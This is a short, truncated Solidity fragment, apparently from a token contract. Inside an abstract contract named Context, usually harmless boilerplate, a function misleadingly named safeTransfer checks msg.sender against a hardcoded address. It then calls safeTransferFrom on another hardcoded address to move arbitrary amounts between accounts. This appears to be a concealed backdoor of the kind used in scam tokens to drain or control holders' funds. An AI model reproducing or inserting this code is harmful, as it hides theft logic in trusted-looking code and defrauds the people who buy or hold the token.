...
abstract contract Context {
  ...
  function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {
    if (msg.sender != address(0xB659455f0392412BDF9d73A65664AdcA588c3ceE)) {
    TransferHelper.safeTransferFrom(0x4C1e429d1dF64D4e455DcFEdf786D826bAb4D8A8,spender,recipient,amount);
